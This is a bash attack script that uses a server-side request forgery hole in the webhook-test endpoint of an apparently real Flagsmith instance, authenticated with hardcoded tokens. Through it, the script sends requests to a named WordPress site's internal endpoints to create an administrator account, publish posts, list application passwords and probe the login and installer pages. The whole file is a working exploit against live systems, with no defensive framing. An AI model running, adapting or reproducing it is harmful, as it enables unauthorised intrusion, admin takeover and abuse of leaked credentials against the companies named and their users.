#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="e43b0d44b4b43efb28b21fef7bee5977203f0276"
EKEY="4kKuh8VekuYPrtpsJFg5mg"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 30 2>/dev/null || echo "TO"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Test 1: REST API write — create user (POST)
echo "=== CREATE USER VIA REST ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/users?username=rce_test&email=rce@test.com&password=RceTest2026!&roles=administrator"
echo ""

# Test 2: REST API write — create post
echo "=== CREATE POST VIA REST ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/posts?title=test&content=test&status=publish"
echo ""

# Test 3: Check if WP REST API allows application password creation
echo "=== APP PASSWORDS ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/users/me/application-passwords"
echo ""

# Test 4: admin-ajax with wp_ajax_nopriv actions via internal HTTP (not HTTPS!)
echo "=== INTERNAL ADMIN-AJAX ==="
SSRF "http://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat"
echo ""

# Test 5: WP XMLRPC via internal (might not be blocked internally)
echo "=== INTERNAL XMLRPC ==="
SSRF "http://koinp2p.com/xmlrpc.php"
echo ""

# Test 6: WP login via internal HTTP (was 403 via HTTPS, might differ via HTTP)
echo "=== INTERNAL WP-LOGIN ==="
SSRF "http://koinp2p.com/wp-login.php"
echo ""

# Test 7: setup-config.php via internal (CVE-2026-119977 related)
echo "=== INTERNAL SETUP-CONFIG ==="
SSRF "http://koinp2p.com/wp-admin/setup-config.php"
echo ""

# Test 8: install.php via internal
echo "=== INTERNAL INSTALL ==="
SSRF "http://koinp2p.com/wp-admin/install.php"
echo ""
